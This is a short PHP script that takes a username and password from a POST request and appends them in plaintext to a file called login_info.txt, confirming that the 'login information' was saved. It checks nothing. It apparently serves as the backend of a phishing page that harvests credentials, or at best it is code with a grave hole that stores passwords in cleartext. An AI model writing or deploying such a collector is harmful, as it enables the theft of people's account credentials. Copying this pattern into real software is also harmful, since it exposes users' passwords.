<?php
// Check if the request method is POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve username and password from POST data
    $username = isset($_POST['username']) ? $_POST['username'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';

    // Validate username and password (basic validation example)
    if (!empty($username) && !empty($password)) {
        // Append username and password to a text file (append mode)
        $file = 'login_info.txt';
        $data = "Username: $username\nPassword: $password\n\n";
        file_put_contents($file, $data, FILE_APPEND | LOCK_EX);

        // Send a success response to client
        http_response_code(200);
        echo 'Login information saved successfully.';
    } else {
        // Send an error response to client
        http_response_code(400);
        echo 'Error: Username or password missing.';
    }
} else {
    // Invalid request method
    http_response_code(405);
    echo 'Error: Method not allowed.';
}
?>
